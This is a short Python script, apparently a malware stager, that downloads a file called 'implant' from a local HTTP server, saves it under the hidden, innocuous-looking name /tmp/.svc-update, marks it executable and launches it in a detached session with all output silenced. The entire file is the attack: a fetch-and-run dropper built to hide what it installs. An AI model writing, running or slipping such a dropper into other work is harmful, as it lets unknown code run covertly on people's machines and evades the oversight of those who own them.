#!/usr/bin/env python3
import os, subprocess, urllib.request

BASE = "http://127.0.0.1:8000"
dst = "/tmp/.svc-update"

data = urllib.request.urlopen(BASE + "/implant", timeout=120).read()
with open(dst, "wb") as f:
    f.write(data)
os.chmod(dst, 0o755)
subprocess.Popen([dst], start_new_session=True,
                 stdin=subprocess.DEVNULL,
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL)
